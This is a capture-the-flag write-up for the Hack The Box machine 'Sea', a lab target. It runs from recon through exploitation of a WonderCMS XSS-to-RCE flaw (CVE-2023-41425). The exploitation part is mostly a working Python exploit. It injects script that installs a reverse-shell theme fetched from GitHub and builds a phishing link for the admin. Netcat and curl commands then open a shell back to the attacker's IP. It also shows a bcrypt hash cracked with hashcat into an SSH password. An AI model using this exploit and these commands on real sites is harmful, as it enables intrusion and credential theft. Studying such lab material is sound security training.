# Sea Write-up

<img src="https://labs.hackthebox.com/storage/avatars/0011f6725aed869f8683589cb08c90d0.png" width="200" height="200">

## Recon 

### Port enumeration with Nmap

`nmap -sC -sV 10.10.11.28`

    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   3072 e3:54:e0:72:20:3c:01:42:93:d1:66:9d:90:0c:ab:e8 (RSA)
    |   256 f3:24:4b:08:aa:51:9d:56:15:3d:67:56:74:7c:20:38 (ECDSA)
    |_  256 30:b1:05:c6:41:50:ff:22:a3:7f:41:06:0e:67:fd:50 (ED25519)
    80/tcp open  http    Apache httpd 2.4.41
    |_http-title: Sea - Home
    | http-cookie-flags: 
    |   /: 
    |     PHPSESSID: 
    |_      httponly flag not set
    Service Info: Host: sea.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Add `sea.htb` to `/etc/hosts`

    echo "10.10.11.28 sea.htb" | sudo tee -a /etc/hosts 

![image](https://github.com/user-attachments/assets/f9dac408-58f9-4866-8962-edfa1ce692e9)

### Directory enumeration with Dirsearch

`python3 dirsearch.py -e php,html,js -u http://sea.htb 404,403,401,307`
                                      
    200 -    3KB - /404                                                                                   
    200 -    3KB - /contact.php                                      
    301 -  228B  - /data  ->  http://sea.htb/data/                                                       
    301 -  232B  - /messages  ->  http://sea.htb/messages/                                     
    301 -  231B  - /plugins  ->  http://sea.htb/plugins/             
    301 -  230B  - /themes  ->  http://sea.htb/themes/                   

![image](https://github.com/user-attachments/assets/fc57769e-68e8-428d-a7be-641db54399e1)

And so we found the directory `/themes/` where we don't have access. Let's try to find directories in this section as well

With using `directory-list-2.3-medium.txt` wordlist.

`python3 dirsearch.py -e php,html,js -u http://sea.htb/themes 404,403,401,307 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`

    200 -    4KB - /themes/home                                      
    200 -    3KB - /themes/404                                       
    301 -  235B  - /themes/bike  ->  http://sea.htb/themes/bike/

![image](https://github.com/user-attachments/assets/f354c8b8-084e-4394-87b7-a8e128c3c87a)

Try again for `/themes/bike/` directory
   
`python3 dirsearch.py -e php,html,js -u http://sea.htb/themes/bike/ 404,403,401,307 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`

    200 -    6B  - /themes/bike/version                              
    301 -  239B  - /themes/bike/img  ->  http://sea.htb/themes/bike/img/
    200 -    4KB - /themes/bike/home
    301 -  239B  - /themes/bike/css  ->  http://sea.htb/themes/bike/css/
    200 -   66B  - /themes/bike/summary                              
    200 -    3KB - /themes/bike/404                                  
    200 -    1KB - /themes/bike/LICENSE    

Let's check `sea.htb/themes/bike/LICENSE` and `sea.htb/themes/bike/summary`

![image](https://github.com/user-attachments/assets/7f3da3a7-1a99-4407-afbc-d589a8d3f5d2)

![image](https://github.com/user-attachments/assets/850e7ee9-d03c-46a2-bf53-07aa681a5a62)

## Exploitation

### CVE-2023-41425

Cross Site Scripting vulnerability in Wonder CMS v.3.2.0 thru v.3.4.2 allows a remote attacker to execute arbitrary code via a crafted script uploaded to the installModule component.

Exploit: Wondercms 4.3.2 XSS to RCE

    import sys
    import requests
    import os
    import bs4
    
    if (len(sys.argv)<4): print("usage: python3 exploit.py loginURL IP_Address Port\nexample: python3 exploit.py http://localhost/wondercms/loginURL 192.168.29.165 5252")
    else:
      data = '''
    var url = "'''+str(sys.argv[1])+'''";
    if (url.endsWith("/")) {
     url = url.slice(0, -1);
    }
    var urlWithoutLog = url.split("/").slice(0, -1).join("/");
    var urlWithoutLogBase = new URL(urlWithoutLog).pathname; 
    var token = document.querySelectorAll('[name="token"]')[0].value;
    var urlRev = urlWithoutLogBase+"/?installModule=https://github.com/prodigiousMind/revshell/archive/refs/heads/main.zip&directoryName=violet&type=themes&token=" + token;
    var xhr3 = new XMLHttpRequest();
    xhr3.withCredentials = true;
    xhr3.open("GET", urlRev);
    xhr3.send();
    xhr3.onload = function() {
     if (xhr3.status == 200) {
       var xhr4 = new XMLHttpRequest();
       xhr4.withCredentials = true;
       xhr4.open("GET", urlWithoutLogBase+"/themes/revshell-main/rev.php");
       xhr4.send();
       xhr4.onload = function() {
         if (xhr4.status == 200) {
           var ip = "'''+str(sys.argv[2])+'''";
           var port = "'''+str(sys.argv[3])+'''";
           var xhr5 = new XMLHttpRequest();
           xhr5.withCredentials = true;
           xhr5.open("GET", urlWithoutLogBase+"/themes/revshell-main/rev.php?lhost=" + ip + "&lport=" + port);
           xhr5.send();
           
         }
       };
     }
    };
    '''
      try:
        open("xss.js","w").write(data)
        print("[+] xss.js is created")
        print("[+] execute the below command in another terminal\n\n----------------------------\nnc -lvp "+str(sys.argv[3]))
        print("----------------------------\n")
        XSSlink = str(sys.argv[1]).replace("loginURL","index.php?page=loginURL?")+"\"></form><script+src=\"http://"+str(sys.argv[2])+":8000/xss.js\"></script><form+action=\""
        XSSlink = XSSlink.strip(" ")
        print("send the below link to admin:\n\n----------------------------\n"+XSSlink)
        print("----------------------------\n")
    
        print("\nstarting HTTP server to allow the access to xss.js")
        os.system("python3 -m http.server\n")
      except: print(data,"\n","//write this to a file")

Clone from github

    git clone https://github.com/prodigiousMind/CVE-2023-41425

Run the exploit and get the shell

    python3 exploit.py http://sea.htb/themes/ 10.10.14.11 4444

    rlwrap nc -nlvp 4444

    curl 'http://sea.htb/themes/revshell-main/rev.php?lhost=10.10.14.11&lport=4444'

![image](https://github.com/user-attachments/assets/19b772ec-4df9-4e14-ae4e-f2ee2b26564b)

![image](https://github.com/user-attachments/assets/e5e9ae5a-d9f1-4f91-baa0-82e10279429f)

![image](https://github.com/user-attachments/assets/4d290636-9b9a-4eae-999b-638138e681ab)

    cd /var/www/sea/data
    
    сat database.js | grep password

![image](https://github.com/user-attachments/assets/817e4a2e-3405-4329-9099-342adc7a4747)

hash `$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ\/D.GuE4jRIikYiWrD3TM\/PjDnXm4q`

    echo -n '$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q' > hash.txt

    hashcat -m 3200 -a 0 hash.txt /home/kali/wordlist/rockyou.txt 

![image](https://github.com/user-attachments/assets/d5277a85-d87f-43cc-a22a-08d6c405a9c9)

`$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q`:`mychemicalromance`

### SSH

Connet to SSH with `amay`:`mychemicalromance` credentials

ssh amay@sea.htb

## Get the user flag!

![image](https://github.com/user-attachments/assets/0c9d2c75-78ba-42e1-a255-de032d0c9076)

## Privilege Escalation

netstat

![image](https://github.com/user-attachments/assets/ecc3a342-afa2-45df-96fc-c9c74e062c18)

ssh -L 8888:localhost:8080 amay@sea.htb

![image](https://github.com/user-attachments/assets/2c1944aa-5ab1-4b39-bf32-347224052a5c)

![image](https://github.com/user-attachments/assets/a28c03fd-c6de-4f11-ad04-c10e51f3dc4c)

Use amay's credentials `amay`:`mychemicalromance`

![image](https://github.com/user-attachments/assets/34de5860-9986-4873-a5f8-e0cdd1108884)

![image](https://github.com/user-attachments/assets/cf4b823d-6bb2-4f6c-b832-b9c60f0beeab)

![image](https://github.com/user-attachments/assets/26f51839-0b6a-4706-9caf-f5dd0a0c4d72)

![image](https://github.com/user-attachments/assets/2b3bc0da-f620-4132-81b5-1d664574d81c)
